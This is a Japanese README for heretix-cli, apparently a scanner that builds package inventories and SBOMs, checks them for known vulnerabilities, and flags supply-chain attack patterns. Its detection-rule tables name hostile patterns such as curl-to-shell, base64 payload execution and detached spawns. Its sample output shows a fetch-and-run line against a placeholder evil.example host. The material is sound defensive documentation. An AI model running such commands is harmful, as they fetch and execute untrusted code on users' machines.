# heretix-cli

[English README](README.md)

Linux/Windows サーバや Docker コンテナイメージの OS パッケージ（RPM, DPKG, APK）および OSS エコシステム（PyPI, npm/yarn/pnpm, Go modules, Composer, Maven, Gradle, JAR/WAR アーカイブ）をスキャンし、脆弱性 API に問い合わせて既知の脆弱性を検出する CLI ツール。API なしで動作するローカルセキュリティ検知として、**GlassWorm**（不可視文字によるマルウェア混入）、**Dependency Confusion**（パッケージ置換攻撃）、**Malicious Install Scripts**（悪意ある install スクリプト。Shai-Hulud ワームのシグネチャを含む）、**CI/CD Pipeline Poisoning**（パイプライン汚染）、**Lock File Integrity**（ロックファイル整合性）の検出に対応。

## 対応エコシステム

| エコシステム | スキャン対象 | 対応プラットフォーム |
|---|---|---|
| RHEL / AlmaLinux / Rocky Linux / Oracle Linux / CentOS (RPM) | `rpm -qa` / コンテナは `rpm --root <rootfs>` | Linux のみ |
| Debian / Ubuntu 系 (DPKG) | `var/lib/dpkg/status` を直接解析 | Linux のみ |
| Alpine (APK) | `/lib/apk/db/installed` を直接解析 | Linux のみ |
| PyPI | `requirements.txt`, `Pipfile.lock`, `poetry.lock`, `uv.lock` / フォールバック: `pip list` | Linux / Windows |
| npm / yarn / pnpm | `package-lock.json`, `yarn.lock`, `pnpm-lock.yaml` / フォールバック: `npm list -g`, `pnpm list -g` | Linux / Windows |
| Go (go modules) | `go.mod` / フォールバック: `go list -m -json all` | Linux / Windows |
| Composer (PHP) | `composer.lock` | Linux / Windows |
| Maven (Java) | `pom.xml` / フォールバック: `mvn dependency:tree` | Linux / Windows |
| Gradle (Java/Kotlin) | `gradle.lockfile` / `build.gradle` / `build.gradle.kts` | Linux / Windows |
| Java アーティファクト | `*.jar`, `*.war`, `*.ear` — `META-INF/maven/*/pom.properties` を読み、`WEB-INF/lib` / `BOOT-INF/lib` を再帰的に解析 | Linux / Windows |

## インストール

### ビルド

```bash
# Linux 向け静的バイナリ
CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -o heretix-cli .

# Windows 向けバイナリ
GOOS=windows GOARCH=amd64 go build -o heretix-cli.exe .
```

生成されたバイナリを対象サーバにコピーするだけでデプロイ完了。

### 依存パッケージ

```bash
go mod tidy
```

## 使い方

### パッケージ収集 (`collect`)

システムをスキャンし、インストール済みパッケージを JSON または CycloneDX SBOM に出力する。オフラインで実行可能。

```bash
heretix-cli collect
heretix-cli collect --output packages.json --scan-path /srv
heretix-cli collect --skip npm,pypi --verbose

# Docker イメージをスキャン
heretix-cli collect --image nginx:latest --output nginx-inventory.json
heretix-cli collect --image registry.example.com/myapp:v1.2 --output myapp-inventory.json

# Dockerfile の FROM ベースイメージも含めてスキャン
heretix-cli collect --image myapp:latest --dockerfile ./Dockerfile --output full-inventory.json

# CycloneDX SBOM (JSON) として出力
heretix-cli collect --format cyclonedx --output sbom.json
heretix-cli collect --image nginx:latest --format cyclonedx --output nginx-sbom.json
```

> **CycloneDX SBOM 出力には以下が含まれる:**
> - OS パッケージ（apk/rpm/deb）の **PURL に `?distro=` qualifier** を付与:
>   ```
>   pkg:apk/alpine/curl@7.79.1-r0?distro=alpine-3.18
>   pkg:rpm/almalinux/curl@7.76.1?distro=almalinux-9
>   ```
> - 全コンポーネントに **`bom-ref`** を設定（PURL と同値、依存グラフの参照解決に必要）
> - lockfile の integrity ハッシュを **`hashes`** に格納（npm/pnpm は SHA-512、PyPI は SHA-256）
> - **`licenses`** をコンポーネントに付与（APK, RPM, Composer, npm node_modules, PyPI site-packages から取得）
> - direct/indirect を示す **`properties[cdx:direct]`** プロパティ
> - 本番ビルドに含まれない dev/test 専用パッケージを示す **`scope: excluded`**（対応状況は下表の `scope` 列を参照）
> - **`bom.dependencies`** セクションによる依存グラフ（npm package-lock.json, pnpm-lock.yaml, uv.lock, poetry.lock, composer.lock）
> - コンテナスキャン時は **`metadata.component`** に OCI PURL とイメージ digest を記録

| フラグ | デフォルト | 説明 |
|---|---|---|
| `--output` | `inventory.json` | 出力ファイルパス |
| `--format` | `json` | 出力形式: `json`（heretix インベントリ）/ `cyclonedx`（CycloneDX BOM） |
| `--scan-path` | `/`（Linux）/ `%SystemDrive%\`（Windows） | ファイルシステムの探索ルートパス |
| `--skip` | (なし) | スキップするソース (例: `--skip npm`) |
| `--verbose` | `false` | 詳細ログ出力 |
| `--image` | (なし) | スキャンする Docker イメージ参照 (例: `nginx:latest`) |
| `--dockerfile` | (なし) | Dockerfile パス: FROM のベースイメージも連鎖スキャン |

#### lockfile 別 SBOM / インベントリ対応状況

各 lockfile から取得できるメタデータフィールドの対応表。
`✓`=完全対応、`△`=部分対応（注記参照）、`—`=フォーマット上取得不可。

| lockfile | パッケージ収集 | `direct` | `deps` | `integrity` | `license` | `scope` |
|---|---|---|---|---|---|---|
| `package-lock.json` v2/v3 | ✓ | ✓ | ✓ | ✓ | △ ⁴ | ✓ ¹⁴ |
| `package-lock.json` v1 | ✓ | — | — | — | △ ⁴ | — |
| `yarn.lock` | ✓ | — | — | — | △ ⁴ | — |
| `pnpm-lock.yaml` v9 | ✓ | ✓ | ✓ | ✓ | △ ⁴ | ✓ ¹⁴ |
| `pnpm-lock.yaml` v5/v6 | ✓ | ✓ | — | ✓ | △ ⁴ | — |
| `requirements.txt` | △ `==` のみ | ✓ | — | △ `--hash=` 付きのみ | △ ⁵ | — |
| `Pipfile.lock` | ✓ | ✓ | — | ✓ | △ ⁵ | ✓ ¹⁴ |
| `poetry.lock` | ✓ | — ¹ | ✓ | — | △ ⁵ | — |
| `uv.lock` | ✓ | ✓ | ✓ | ✓ | △ ⁵ | — |
| `go.mod`（直接解析） | △ 宣言済みのみ | ✓ | — | — | △ ¹¹ | — |
| `go list`（フォールバック） | ✓ transitive 含む | — ² | — | — | △ ¹¹ | — |
| `composer.lock` | ✓ | △ ³ | ✓ | — | ✓ | ✓ ¹⁴ |
| `pom.xml`（mvn コマンド） | ✓ transitive 含む | ✓ | ✓ | — | △ ⁶ | ✓ ¹⁵ |
| `pom.xml`（直接解析） | △ 宣言済みのみ | △ | — | — | △ ⁶ | ✓ ¹⁵ |
| `gradle.lockfile` | ✓ transitive 含む | — ⁷ | ✓ | — | △ ¹² | ✓ ¹⁴ |
| `build.gradle(.kts)`（直接解析） | △ 宣言済みのみ | △ | — | — | △ ¹² | ✓ ¹⁵ |
| `*.jar` / `*.war` / `*.ear` | ✓ ⁸ | — ⁹ | — | ✓ SHA-256 | △ ¹⁰ | — |
| RPM | ✓ | — | — | — | ✓ | — |
| DPKG | ✓ | — | — | — | △ ¹³ | — |
| APK | ✓ | — | — | — | ✓ | — |

¹ poetry.lock の `direct` 判定は `pyproject.toml` の読み取りが必要なため未実装。  
² `go` コマンドが利用可能な場合は `go list` を優先するため transitive deps が取れるが、`direct` 情報は失われる。  
³ composer.lock の `direct` 判定は同ディレクトリに `composer.json` が必要。  
⁴ npm の `license` は `node_modules/*/package.json` から取得（パッケージがインストール済みの場合のみ）。lockfile 解析、pnpm virtual store、`npm`/`pnpm` グローバルインストールのフォールバック（`npm root -g`/`pnpm root -g`）のすべてに対応。  
⁵ PyPI の `license` は `site-packages/*.dist-info/METADATA` から取得（パッケージがインストール済みの場合のみ）。  
⁶ Maven の `license` は `pom.xml` の `<licenses>` タグから取得（ルートプロジェクトのライセンスのみ、transitive 依存のライセンスは含まれない）。  
⁷ `gradle.lockfile` では `direct` 情報が利用不可（すべての依存がフラット化された形式）；`direct: null` で不明を示す。  
⁸ 座標は `META-INF/maven/{groupId}/{artifactId}/pom.properties` から取得し、無い場合は `MANIFEST.MF` の `Implementation-Vendor-Id`/`-Title`/`-Version` が揃っていればそれを使う。どちらも無いアーカイブはファイル名から推測せずスキップする（groupId を欠いた PURL はどの脆弱性情報にもマッチしないため）。ネストしたアーカイブは `app.war!/WEB-INF/lib/lib.jar` の形式で記録する。  
⁹ ビルド済みアーティファクトには直接依存か推移的依存かの記録が無い。同じパッケージが `pom.xml` からも検出された場合は1件にマージされ、ビルド定義側の `direct` が採用される。  
¹⁰ `license` は `pom.properties` と同じディレクトリに埋め込まれた `pom.xml` から取得する（Maven でビルドされた JAR のみ）。  
¹¹ Go の `license` は `GOMODCACHE` 内のモジュールの `LICENSE`/`LICENSE.md`/`LICENSE.txt`/`LICENCE`/`COPYING` ファイルから取得し、冒頭部分を既知のライセンス見出し（MIT, Apache-2.0, BSD-2/3-Clause, MPL-2.0, GPL/LGPL-3.0, ISC, Unlicense）と照合して判定する。事前にローカルビルドが必要 — モジュールキャッシュはコンテナイメージの外にあるため、ライブホストスキャンでのみ有効。  
¹² Gradle の `license` はローカルの Gradle モジュールキャッシュ（デフォルト `~/.gradle/caches/modules-2/files-2.1`、または `$GRADLE_USER_HOME`）内の依存先 POM から取得する — Go と同じくライブホスト限定。  
¹³ DPKG の `license` は `/usr/share/doc/{package}/copyright`（DEP-5 machine-readable format の `License:` フィールド）から取得する — 多くのパッケージで存在するが、自由形式の copyright ファイルを使う upstream もあるため保証はない。  
¹⁴ `scope: excluded` は、devDependencies / `packages-dev` / `develop` / test専用の Gradle configuration からのみ解決されるパッケージ ― lockfile の依存グラフには存在するが、本番ビルド（`pnpm prune --prod` など）には含まれない ― を示す。`—` の場合は、dev/test専用パッケージも本番パッケージと同様、区別なく報告される。  
¹⁵ Maven と Gradle のビルドファイル直接解析パスは、`scope=test`（Maven）/ test専用 configuration（Gradle）の依存をタグ付けせず、そもそも出力から除外する。タグ付けではなくフィルタリングによる対応だが、実質的な結果は同じ。

`deps` の PURL、`integrity` ハッシュ、および `license` 情報は、CycloneDX 出力の `bom.dependencies`、`components[].hashes`、`components[].licenses` にそれぞれ反映される。

### 脆弱性チェック (`check`)

collect で出力した JSON を読み込み、脆弱性 API に問い合わせる。

```bash
heretix-cli check inventory.json
heretix-cli check inventory.json --api-url http://heretix-api:5000 --api-key your-secret-key --severity 7.0
heretix-cli check inventory.json --format json > results.json
```

| フラグ | デフォルト | 説明 |
|---|---|---|
| `--api-url` | `http://localhost:3001` | heretix-api の URL |
| `--api-key` | (なし) | API 認証キー（環境変数 `HERETIX_API_KEY` でも設定可） |
| `--format` | `table` | 出力形式: `table` / `json` |
| `--severity` | `0.0` | CVSS スコアの最小閾値 |
| `--concurrency` | `10` | 並行 API リクエスト数 |
| `--timeout` | `30s` | リクエストごとのタイムアウト |
| `--verbose` | `false` | 詳細ログ出力 |

### 一気通貫スキャン (`scan`)

collect と check をワンコマンドで実行する。中間ファイル不要。

```bash
# ライブシステムスキャン
heretix-cli scan
heretix-cli scan --scan-path /srv --api-url http://heretix-api:5000 --api-key your-secret-key --severity 7.0

# Docker イメージスキャン
heretix-cli scan --image nginx:latest --api-url http://heretix-api:5000 --api-key your-secret-key
heretix-cli scan --image 123456789.dkr.ecr.ap-northeast-1.amazonaws.com/myapp:v1.2 --severity 7.0

# Dockerfile の FROM ベースイメージも含めて一括スキャン
heretix-cli scan --image myapp:latest --dockerfile ./Dockerfile --api-url http://heretix-api:5000

# 環境変数で API キーを指定
HERETIX_API_KEY=your-secret-key heretix-cli scan --api-url http://heretix-api:5000
```

`--image` フラグ指定時は Docker デーモンをまず参照し、見つからない場合はレジストリから直接 pull します。レジストリ認証は `~/.docker/config.json` から自動読み込みされます（ECR, GCR, Docker Hub 対応）。

`--image` 指定時、生成される inventory.json の `hostname` はマシンのホスト名ではなく**イメージ参照**（例: `nginx:latest`）に設定されます。これにより、複数のイメージを heretix-management にインポートした際に各イメージが独立したアセットとして管理されます。

上記コマンドは `collect` と `check` の全フラグを継承する。

| フラグ | デフォルト | 説明 |
|---|---|---|
| `--image` | (なし) | スキャンする Docker イメージ参照 |
| `--dockerfile` | (なし) | Dockerfile パス: FROM のベースイメージも連鎖スキャン |
| `--skip-local` | `false` | ローカルセキュリティ検知をスキップ（GlassWorm・Dependency Confusion・Malicious Install・CI/CD Poisoning・Lock File Integrity） |
| `--check-registry` | `false` | 未知の npm スコープを npmjs.org に問い合わせて判定（ネットワーク必須） |

### GitHub Dependency Submission (`submit`)

インベントリ JSON を読み込み、[GitHub Dependency Submission API](https://docs.github.com/en/rest/dependency-graph/dependency-submission) に送信する。送信後、Dependabot が検出パッケージの既知の脆弱性に対してアラートを生成する。

```bash
# GitHub Actions での典型的な使い方（環境変数は Actions が自動設定）
heretix-cli collect --output inventory.json
heretix-cli submit inventory.json

# 手動実行
heretix-cli submit inventory.json \
  --token ghp_xxx \
  --repo owner/repo \
  --sha $(git rev-parse HEAD) \
  --ref refs/heads/main
```

| フラグ | デフォルト | 説明 |
|---|---|---|
| `--token` | `$GITHUB_TOKEN` | `contents: write` 権限を持つ GitHub トークン |
| `--repo` | `$GITHUB_REPOSITORY` | `owner/repo` 形式のリポジトリ名 |
| `--sha` | `$GITHUB_SHA` | スナップショットと紐付けるコミット SHA |
| `--ref` | `$GITHUB_REF` | Git ref（例: `refs/heads/main`） |
| `--correlator` | `heretix-cli` | 検出器を識別する文字列。同じ値で送信すると前回のスナップショットを上書き |
| `--job-id` | `$GITHUB_RUN_ID` | 今回の実行を識別する一意 ID |

lockfile から検出されたパッケージはソースファイル単位でマニフェストにグループ化される。`go.mod` の `// indirect`・`package-lock.json` のルート `dependencies`・`pnpm-lock.yaml` の `importers:` から判定した direct 依存は `relationship: "direct"` で送信される。

### ローカル検知のみ実行 (`detect`)

脆弱性 API を使わず、ローカルセキュリティ検知だけを実行する。オフラインで動作可能。

```bash
heretix-cli detect
heretix-cli detect --scan-path /srv/myapp
heretix-cli detect --format json

# Docker イメージをスキャン
heretix-cli detect --image nginx:latest
heretix-cli detect --image myapp:latest --dockerfile ./Dockerfile
```

| フラグ | デフォルト | 説明 |
|---|---|---|
| `--scan-path` | `/`（Linux）/ `%SystemDrive%\`（Windows） | ファイルシステムの探索ルートパス |
| `--image` | (なし) | スキャンする Docker イメージ参照 |
| `--dockerfile` | (なし) | Dockerfile パス: FROM のベースイメージも連鎖スキャン |
| `--format` | `table` | 出力形式: `table` / `json` |
| `--verbose` | `false` | 詳細ログ出力 |
| `--check-registry` | `false` | 未知の npm スコープを npmjs.org に問い合わせて判定（ネットワーク必須） |

## ローカルセキュリティ検知

> **ベータ版**: ローカルセキュリティ検知は現在ベータ版です。検知ルールは誤検知を含む場合があり、今後のリリースでカバレッジが拡充される予定です。

`scan` および `detect` コマンドは、ネットワークアクセスを必要としない 5 種類のローカル検知を実行します。

**自動スキップパス** — 誤検知防止と不要な I/O 削減のため、以下のディレクトリを自動的にスキップします。

- **ホストスキャン時**: `/proc`、`/sys`、`/dev`、`/boot`、`/run`、`/tmp`、`/var/lib/docker`、`/var/lib/containerd`、`/var/lib/kubelet`、`/usr/src`、`/usr/local/lib/python*`、`/usr/lib/python*`
- **Docker イメージスキャン時**（`--image`）: 上記に加え `/usr/share`、`/usr/lib/locale`、`/usr/lib/node_modules`、`/var/cache`、`/var/lib/apt`、`/var/lib/dpkg`

### GlassWorm 検知

ソースファイル内の不可視・ゼロ幅 Unicode 文字を検出します。レビュアーには見えないが、インタープリタに実行される形でマルウェアを埋め込む攻撃に対応します。

| 文字 | Severity |
|---|---|
| U+202A–U+202E BiDi 制御文字（RLO, LRO 等） | CRITICAL |
| U+2028, U+2029 行区切り・段落区切り | HIGH |
| U+FEFF BOM（ファイル先頭以外） | HIGH |
| U+200B/C/D ゼロ幅スペース・結合子 | MEDIUM |
| U+2060, U+034F ワードジョイナー等 | MEDIUM |

**U+200B/200C/200D のコンテキスト判定**: これらの文字はデーバーナーガリー・アラビア文字・ヘブライ文字・タイ語など非ラテン系スクリプトの合字・改行制御に必須です。隣接文字が両側とも ASCII の場合のみフラグを立てます（コードへの注入パターン）。

対象ファイル: `*.py`, `*.js`, `*.ts`, `*.go`, `*.php`, `*.rb`, `*.lock`, `*.toml`, `*.cfg`（JSON は実行されるコードではないため除外）

**ファイル単位の集約**: 同一文字は出現ごとではなく、ファイル単位で1件にまとめて報告します（最初の出現行と総出現回数を付記）。該当ファイルには同じ文字が多数出現するのが通常であり、対処の単位がファイルと文字の組であるためです。

スキップ: `site-packages`、`dist-packages`、`Trash`、`.Trash`、`node_modules`、`vendor`、`.venv`、`venv`、`__pycache__`、`.tox`、`.git`、`testdata`。`*.min.js` などのミニファイルおよびコンテンツハッシュを含む webpack/vite チャンクファイルも除外。

> `testdata` は全検知器でスキップします。Go ツールチェーンと同様の扱いで、中身はビルドも実行もされないフィクスチャであり、セキュリティツールでは意図的に悪意ある検体を配置するためです。

### Dependency Confusion 検知

内部パッケージ名を公開レジストリに登録し、意図しない公開版がインストールされる攻撃（依存関係混乱攻撃）への脆弱な設定を検出します。

**追加レジストリを前提とした判定**: 置換攻撃には置換元となる第2のレジストリが必要なため、npm・PyPI とも追加レジストリが設定されている場合にのみ検査します。スコープ検査は `.npmrc` が npmjs.org 以外のレジストリを宣言している場合に限り実行します（`.npmrc` の存在自体は判定材料になりません。多くは `shamefully-hoist` などの動作設定のみを含みます）。PyPI 側も同様に、緩いバージョン指定は `--extra-index-url` がある場合にのみ報告します。インデックスが1つの場合、バージョン範囲が別パッケージに解決されることはありません。

`@types`、`@prisma`、`@fastify`、`@nestjs`、`@aws-sdk` など広く知られた公開スコープは自動的に除外します。`--check-registry` を使うと、アローリスト外のスコープを npmjs.org に問い合わせて動的に判定できます。

| チェック内容 | エコシステム | Severity |
|---|---|---|
| `.npmrc` が私有レジストリを宣言している状況で、マッピングのないスコープ | npm | HIGH |
| `package-lock.json` / `yarn.lock` / `pnpm-lock.yaml` で社内スコープパッケージが公開レジストリから解決されている | npm | HIGH |
| 完全に未固定のバージョン（`*`、`latest`、`next`、またはバージョン未指定） | npm | MEDIUM |
| `requirements.txt` / `pip.conf` に `--extra-index-url`（pip は全インデックスで最高バージョンを選択） | PyPI | HIGH |
| 範囲指定バージョン（`>=`, `~=`）— **追加インデックス設定時のみ** | PyPI | MEDIUM |
| `--hash=sha256:` インテグリティチェックなし — **追加インデックス設定時のみ** | PyPI | LOW |
| 公開 `GOPROXY` かつ内部モジュールパスを `GOPRIVATE` がカバーしていない | Go | HIGH |
| `go.mod` にあるモジュールが `go.sum` に存在しない | Go | MEDIUM |

`--check-registry` は `https://registry.npmjs.org/-/v1/search?text=scope:<name>&size=1` で未知スコープを検索します。パッケージが1件以上あれば公開スコープとして除外します。1回のスキャン中はキャッシュされます。

### Malicious Install Scripts 検知（Shai-Hulud、RedC2）

npm ライフサイクルフック（`preinstall`、`postinstall`、`prepare` 等）、パッケージのエントリポイント、Python `setup.py` 内の危険なコマンドを検出します。インストール時またはインストール後に自動実行されるため、サプライチェーン攻撃の主要な侵入経路です。

**フックスクリプトの追跡**: フックのコマンド文字列自体は無害な場合が多く、Shai-Hulud ワームでは `node bundle.js` であり、ペイロードは参照先ファイルに存在します。フックがローカルスクリプト（`node x.js`、`python x.py`、`sh x.sh`）を実行する場合、そのファイルの内容も検査対象とします。

**難読化による判別（フックスクリプトのみ）**: インストール時のダウンロードと実行は、ネイティブバイナリを持つパッケージの正当な動作でもあります。esbuild の `install.js` はプラットフォーム別バイナリを取得して実行しており、操作内容は攻撃と同一です。両者の差は可読性にあり、esbuild の最長行は125文字、Shai-Hulud のバンドルは1行が数千文字に達します。このため追跡先スクリプト内でのパターン一致は MEDIUM を上限とし、難読化されたスクリプトの実行自体を HIGH とします。難読化はこの種の検査を回避する目的で行われるためです。

**エントリポイントは判定基準が異なります**: RedC2 キャンペーンは lifecycle フックを一切使いませんでした。ペイロードはパッケージのエントリポイント（`main`/`module`/`exports`）内のトップレベル IIFE で、依存グラフ内のどこかで最初に `import`/`require` された時点で実行されます。`--ignore-scripts` は無力です。ただし、エントリポイントはフックのような「独立した小さなスクリプト」ではなく「パッケージ本体そのもの」なので、上記のフックスクリプト向けの判定基準はそのまま持ち込めません。minify された `dist/index.cjs` はバンドラーがほぼ全てのパッケージで生成する通常の形式であり、`child_process`/Base64 も実際の機能として普通に使われます。ここで検査するのは**detached な spawn** のみです — `spawn(...)`/`exec(...)` と `detached: true` の組み合わせで、ビルド時のヘルパーが Node 終了後もプロセスを生かし続ける正当な理由はどんなビルドでもありません。spawn 対象がローカルファイルに解決できる場合、拡張子に関わらず先頭バイトを ELF（Linux）、PE（Windows、`MZ`）、Mach-O（macOS、universal binary 含む）のマジックナンバーと照合します。同梱バイナリはデータファイルに見える名前（`.bin`、`.dat`）が付けられることが多いためです。RedC2 自体は Linux を標的にしていましたが、detached spawn は Linux 固有の手口ではないため、ELF だけでなく3形式すべてを照合します。

| チェック内容 | エコシステム | Severity |
|---|---|---|
| `curl`/`wget` の出力をシェルにパイプ（`\| sh`、`\| bash`） | npm / PyPI | CRITICAL |
| Base64 デコードしたペイロードをシェルに実行 | npm | CRITICAL |
| ネットワーク fetch した内容を `eval()` | npm | CRITICAL |
| `setup.py` 内の `eval()` | PyPI | CRITICAL |
| エントリポイントが `detached: true` で子プロセスを spawn | npm | CRITICAL |
| install フックが難読化されたスクリプトを実行 | npm | HIGH |
| 実行可能な `.pth` ファイル（import 不要で Python 起動のたびに実行される） | PyPI | HIGH |
| フックコマンド自体に `require('child_process')` / `curl` / `node -e` | npm | HIGH |
| `setup.py` 内の `exec(compile(...))` 難読化 | PyPI | HIGH |
| `setup.py` 内の `os.system()` / `subprocess.*()` かつ同一ファイルにネットワーク取得あり | PyPI | HIGH |
| 上記のフックコマンド系パターンが**追跡先**フックスクリプト内で見つかった場合 | npm | MEDIUM |
| フック内の Base64 デコード（`Buffer.from(..., 'base64')`） | npm | MEDIUM |
| install フック内の `fetch()` アウトバウンド呼び出し | npm | MEDIUM |
| `setup.py` 内のネットワークリクエスト | PyPI | MEDIUM |
| `setup.py` 内の `os.system()` / `subprocess.*()` 単独 | PyPI | LOW |

`package.json`（`node_modules/` 配下を含む）、各パッケージの解決済みエントリポイント、`setup.py`、`*.pth` を対象にスキャン。

### CI/CD Pipeline Poisoning 検知

ビルドパイプラインを乗っ取ったりシークレットを窃取するために使われる CI/CD 設定ファイルのパターンを検出します。

**`run:` ブロック限定の判定**: YAML のインデントを追跡し、シェル系ルールは実際にシェルへ渡される箇所でのみ判定します。シークレットの扱いに特に影響し、`env: TOKEN: ${{ secrets.X }}` や `with: token: ${{ secrets.X }}` は正規の記述であるため報告しません。シェルコマンドに直接展開された場合（コマンドラインとログに露出する）のみ報告します。

**所有者に基づくアクション固定の判定**: GitHub は first-party アクションについてメジャータグでの固定を推奨しているため、`actions/checkout@v4` は報告しません。サードパーティのタグ固定は LOW で報告します。タグは force-push が可能であり、tj-actions/changed-files の侵害（CVE-2025-30066）はこれを悪用した事例ですが、大半のタグ固定は正常な運用です。

| チェック内容 | 対象システム | Severity |
|---|---|---|
| `curl`/`wget` の出力をシェルにパイプ | 全システム | CRITICAL |
| Base64 デコードしたペイロードをシェルに実行 | 全システム | CRITICAL |
| ユーザー制御の GitHub イベントデータを `run:` ステップに埋め込み（スクリプトインジェクション） | GitHub Actions | CRITICAL |
| `pull_request_target` ワークフローが PR 自身の head をチェックアウト | GitHub Actions | CRITICAL |
| `run:` ステップ内のアウトバウンド `curl`/`wget` | 全システム | HIGH |
| `run:` 内でシェルコマンドに GitHub シークレットを展開 | GitHub Actions | HIGH |
| ミュータブルな参照へのアクション固定（`@main`、`@master`、`@latest`） | GitHub Actions | HIGH |
| 信頼できないトリガから到達可能な self-hosted runner | GitHub Actions | HIGH |
| `remote: https://` によるリモートパイプライン設定読み込み | GitLab CI | HIGH |
| `run:` ステップ内の `node -e` / `python -c` インライン実行 | 全システム | MEDIUM |
| サードパーティアクションのコミット SHA ではなくタグへの固定 | GitHub Actions | LOW |

`pull_request_target` はベースリポジトリのシークレットと特権トークンを持つ文脈で動作するため、ここで PR 自身のコードをチェックアウトすると、外部からの変更をその権限で実行することになります（Nx s1ngularity 侵害の起点）。self-hosted runner はキャッシュされた資格情報と内部ネットワークへの到達性を持つため、信頼できないトリガ（`pull_request_target`、`issue_comment`）から到達可能な場合にのみ報告します。信頼できるトリガのみで使用する self-hosted runner は通常の構成です。

`.github/workflows/*.yml`、`Jenkinsfile`、`.gitlab-ci.yml`、`.circleci/config.yml`、`azure-pipelines.yml`、`bitbucket-pipelines.yml` を対象にスキャン。

### Hardcoded Secrets 検知

> **注: 一時的に無効化されています。** 検知ロジックは実装済みですが、現在は実行されません。

ソースコードや設定ファイルに直接コミットされた認証情報・API キーを、2 つの手法で検出します。

**既知フォーマットパターン**（コンテキスト不問でフラグ）:

| シークレット種別 | Severity |
|---|---|
| AWS Access Key ID（`AKIA...`） | CRITICAL |
| GitHub トークン（`ghp_`、`ghs_`、`gho_`、`github_pat_`） | CRITICAL |
| npm アクセストークン（`npm_...`） | CRITICAL |
| Slack トークン（`xox[baprs]-...`） | CRITICAL |
| Stripe Live シークレットキー（`sk_live_...`） | CRITICAL |
| SendGrid API キー（`SG....`） | CRITICAL |
| Google API キー（`AIza...`） | CRITICAL |
| Google OAuth クライアントシークレット（`GOCSPX-...`） | CRITICAL |
| PEM 秘密鍵ヘッダ | CRITICAL |
| JWT（JSON Web Token） | HIGH |
| Stripe テストシークレットキー（`sk_test_...`） | MEDIUM |

**エントロピー検知**: `api_key = "..."` や `token: "..."` などの代入パターンで値を抽出し、Shannon エントロピー ≥ 4.5 bits/文字 のものをフラグ。純粋な16進数文字列（コミットハッシュ等）は除外。

プレースホルダ値（`changeme`、`YOUR_KEY_HERE`、`<token>`、環境変数参照 `$MY_SECRET` 等）は自動除外。シークレット値は出力で `先頭6文字***` にマスクされ、ログへの認証情報漏洩を防止。

`.go`、`.py`、`.js`、`.ts`、`.rb`、`.php`、`.java`、`.cs`、`.sh`、`.bash`、`.env`、`.yaml`、`.yml`、`.toml`、`.json`、`.xml`、`.ini`、`.cfg`、`.conf`、`.properties`、`.tf` を対象にスキャン。`*.example`、`*.template`、`*_test.go`、`*.spec.ts` 等はスキップ。`target/`、`.next/`、`.nuxt/` も除外ディレクトリに追加。

### Lock File Integrity 検知

ロックファイルの弱いハッシュや欠落を検出し、マニフェストとロックファイルのドリフト（不整合）を確認します。

| チェック内容 | 対象ファイル | Severity |
|---|---|---|
| 直接依存が SHA-1 integrity を使用（衝突攻撃が可能な破損済みアルゴリズム） | `package-lock.json` | HIGH |
| `package.json` に宣言されているが `package-lock.json` に存在しない | `package-lock.json` | MEDIUM |
| `go.mod` の require にあるモジュールが `go.sum` に存在しない（未検証） | `go.sum` | MEDIUM |
| `Pipfile.lock` のパッケージにハッシュエントリがない（インストール時に整合性検証不可） | `Pipfile.lock` | MEDIUM |

## 出力例

### テーブル出力 (デフォルト)

```
Vulnerability Check Report
==========================
Source:     inventory.json
Host:       server01
Packages:   1523 checked (rpm: 1200, dpkg: 320, pip: 280, npm: 43)

  ECOSYSTEM   PACKAGE          VERSION    SOURCE                DB    VULN ID               CVSS   EPSS  SUMMARY
  ──────────  ───────────────  ─────────  ────────────────────  ───   ───────────────────   ────   ─────  ──────────────
! AlmaLinux   curl             7.88.1     rpm                   nvd   CVE-2024-1234          9.8   0.950  Remote code exec
  AlmaLinux   openssl          3.0.11     rpm                   osv   ALSA-2024:5678         7.5   0.123  Buffer overflow
  Debian      libssl3          3.0.11     dpkg                  nvd   CVE-2024-5678          7.5   0.098  Buffer overflow
  PyPI        requests         2.31.0     /srv/myapp/req...     osv   GHSA-xxxx-yyyy         6.1   0.045  SSRF via proxy
~ PyPI        somepkg          v2024.1    pip                   osv   GHSA-zzzz-zzzz         6.0       -  Some vulnerability
# npm         malicious-pkg    1.0.0      pnpm-lock.yaml        osv   MAL-2024-1234            -       -  Malicious package

# = malicious package (OSSF Malicious Packages)
! = in CISA Known Exploited Vulnerabilities (KEV) catalog
~ = approximate match (version could not be normalized, showing all vulnerabilities for this package)
DB = data source (osv = Open Source Vulnerabilities, nvd = NIST NVD, advisory = Vendor Advisory)
EPSS = Exploit Prediction Scoring System probability (0.000–1.000)

Summary: 14 packages with 21 findings (1 malware, 1 KEV)
  Malware:          1
  Critical (>=9.0): 1
  High (>=7.0):     4
  Medium (>=4.0):   8
  Low (<4.0):       5

Local Security Findings
=======================
  TYPE            FILE                                LINE  SEVERITY  DETAIL
  ─────────────── ─────────────────────────────────── ────  ────────  ────────────────────────────────────
G glassworm          /app/utils.py                         42  CRITICAL  invisible char U+202E (RIGHT-TO-LEFT OVERRIDE) detected
D dep-confusion      /app/.npmrc                            -  HIGH      scoped package @myco has no registry mapping in .npmrc
D dep-confusion      /app/requirements.txt                 15  HIGH      --extra-index-url found: pip selects highest version across all indexes
M malicious-install  /app/package.json                      -  CRITICAL  postinstall: remote code download piped to shell — curl https://evil.example/install.sh | sh
C cicd-poisoning     /app/.github/workflows/ci.yml         12  HIGH      [github-actions] action pinned to mutable branch ref — uses: actions/checkout@main
L lockfile-integrity /app/package-lock.json                 -  HIGH      lodash: integrity uses SHA-1 (broken) — regenerate lockfile with npm ≥ 5 to get SHA-512

G = GlassWorm（不可視・ゼロ幅文字の混入）
D = Dependency Confusion（公開レジストリから解決可能な内部パッケージ）
M = Malicious Install（ライフサイクルフック内の危険なコマンド）
C = CI/CD Poisoning（パイプライン設定の攻撃パターン）
L = Lock File Integrity（弱いハッシュまたはマニフェスト／ロックファイルの不整合）

Local findings: 6 (1 glassworm, 2 dep-confusion, 1 malicious-install, 1 cicd-poisoning, 1 lockfile-integrity)
```

### JSON 出力 (`--format json`)

stdout に JSON のみ出力（脆弱性結果と `localFindings` フィールドのローカル検知結果を含む）。進捗ログは stderr に出力されるため、パイプ処理が可能。

## 終了コード

| コード | 意味 |
|---|---|
| `0` | 脆弱性・マルウェア・ローカル検知結果なし（collect の場合は成功） |
| `1` | 脆弱性、マルウェア、またはローカルセキュリティ検知結果あり（CI/CD 連携用） |
| `2` | 実行失敗 |

## CI/CD での利用例

